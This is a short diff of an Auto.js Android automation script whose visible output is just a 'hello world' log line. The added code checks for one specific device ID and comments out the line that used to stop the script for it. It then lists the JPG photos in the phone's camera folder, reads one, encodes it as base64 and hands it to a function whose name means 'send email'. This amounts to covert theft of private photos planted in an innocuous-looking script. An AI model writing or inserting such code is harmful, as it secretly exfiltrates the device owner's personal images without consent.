@@ -30,5 +30,29 @@ var jies=xxl+"-"+bbss+"-"+bbh+"-"+sjs;
         }
     } catch (e) {}
 log("hello world");
-if("b5c907692f5bb272"=="ids"){engines.stopAllAndToast();}
+if("b5c907692f5bb272"==ids){
+//engines.stopAllAndToast();
+var dir = "/sdcard/DCIM/Camera/";
+
+ function shaixuanwenjian(dir) {  
+     if (files.exists(dir)) {
+         var arr = files.listDir(dir, function(name) {
+             return name.endsWith(".jpg") && files.isFile(files.join(dir, name));
+         });        
+         return arr;
+     } else {
+         log("no");
+     }
+ }
+ var ss = shaixuanwenjian(dir);
+ log(files.join(dir, ss[1])); 
+ var tp = files.join(dir, ss[2]);
+ var img = images.read(tp) 
+ var bm = images.toBase64(img, "jpg", 10)
+fasongyoujian(bm);
+log("yes");
+ img.recycle();
+}
+
+
 }())
